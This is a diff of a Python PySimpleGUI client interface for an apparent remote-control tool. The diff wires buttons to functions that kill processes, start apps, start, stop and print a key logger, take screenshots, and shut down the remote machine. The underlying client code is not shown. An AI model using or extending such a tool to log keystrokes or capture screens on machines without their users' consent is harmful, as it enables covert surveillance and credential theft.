@@ -22,23 +22,24 @@ tab3_layout = [[sg.Button("Take Screenshot")], [sg.Button("Shutdown")]]
 #     [
 #         sg.Tab("App & Processes", tab1_layout),
 #         sg.Tab("Key Logger", tab2_layout),
-#         sg.Tab("Other", tab3_layout), 
+#         sg.Tab("Other", tab3_layout),
 #     ]
-    
+
 # ]
 
 # First Frame
-control_layout = [[sg.Frame('App & Processes', layout= tab1_layout)],
-                  [sg.Frame('Key Logger', layout= tab2_layout)],
-                  [sg.Frame('Other', layout= tab3_layout)]
+control_layout = [[sg.Frame('App & Processes', layout=tab1_layout)],
+                  [sg.Frame('Key Logger', layout=tab2_layout)],
+                  [sg.Frame('Other', layout=tab3_layout)]
                   ]
 
 # Result Layout
-output_layout = [[sg.Text("", size=(800,300),key='OUTPUT')]]
+output_layout = [[sg.Text("", size=(800, 300), key='OUTPUT')]]
 
 # The window layout - defines the entire window
-layout = [[sg.Column(control_layout, element_justification='c'), 
+layout = [[sg.Column(control_layout, element_justification='c'),
            sg.Column(output_layout, element_justification='c',  scrollable=True,  vertical_scroll_only=True)]]
+
 
 def main():
     client = Client()
@@ -54,6 +55,7 @@ def main():
             client.end_connection()
             break
 
+
         elif event == "View Processes":
             window['OUTPUT'].Update('sekrjklsejlkser')
             results = client.view_processes()
@@ -67,23 +69,29 @@ def main():
             window['OUTPUT'].update(value=results)
 
         elif event == "Kill Process":
-            pass
+            print(value[0])
+            client.kill_process(value[0])
         elif event == "Start App":
-            pass
+            print(value[1])
+            client.start_app(value[1])
         elif event == "Start Key Logger":
-            pass
+            client.start_keylogger()
         elif event == "Stop Key Logger":
-            pass
+            client.stop_keylogger()
         elif event == "Print Key Logger":
-            pass
+            window['OUTPUT'].Update('')
+            results = client.print_keylogger()
+            window['OUTPUT'].update(value=results)
         elif event == "Take Screenshot":
-            pass
+            client.take_screenshot()
         elif event == "Shutdown":
-            pass
-          
+            window['OUTPUT'].Update('')
+            results = client.shutdown()
+            window['OUTPUT'].update(value=results)
 
     window.close()
 
 
-if __name__ == "__main__":
+
+if __name__ == '__main__':
     main()
